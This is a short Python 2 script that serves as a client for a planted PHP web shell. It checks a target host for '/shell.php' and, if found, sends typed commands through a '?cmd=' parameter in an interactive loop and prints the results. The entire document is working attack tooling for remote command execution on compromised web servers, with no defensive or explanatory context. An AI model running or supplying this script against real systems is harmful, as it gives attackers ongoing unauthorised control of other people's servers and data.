import requests, sys

target = sys.argv[1]

PATHS = [
    "/",
]

headers = { "User-Agent": "Pikachu Fights",
    "Accept": "*/*"
}

shell = "shell.php"

for x in PATHS:
    url = 'http://' + target + x + shell
    resp_head = requests.head(url, headers=headers)
    if resp_head.status_code == 200:
	verify=True
	url=url + "?cmd="
	while verify:
	    cmd=raw_input("Interactive_Shell> ")
	    r = requests.get(url + cmd,headers=headers)
	    print r.content
	    if cmd == "exit":
			exit()
